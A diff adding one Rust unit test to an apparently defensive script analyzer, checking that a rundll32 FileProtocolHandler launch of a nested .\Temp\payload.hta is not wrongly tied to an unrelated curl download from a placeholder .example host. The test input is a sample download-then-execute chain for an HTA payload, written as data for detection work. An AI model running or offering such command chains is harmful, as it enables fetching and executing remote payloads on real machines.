@@ -7996,6 +7996,28 @@ rundll32 url.dll,FileProtocolHandler .\payload.hta"#,
     }
 
     #[test]
+    fn rundll32_fileprotocolhandler_current_dir_nested_target_does_not_use_unrelated_basename_download(
+    ) {
+        let report = crate::analyze(
+            br#"curl -o D:\Other\payload.hta https://rundll32-current-dir-wrong-basename.example/payload.hta
+rundll32 url.dll,FileProtocolHandler .\Temp\payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"rundll32 url.dll,FileProtocolHandler .\Temp\payload.hta"#
+                            && url == "https://rundll32-current-dir-wrong-basename.example/payload.hta"
+                )
+            }),
+            "rundll32 current-dir nested target reused unrelated basename download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rundll32_slash_equivalent_dll_resolves_full_path_download_source() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
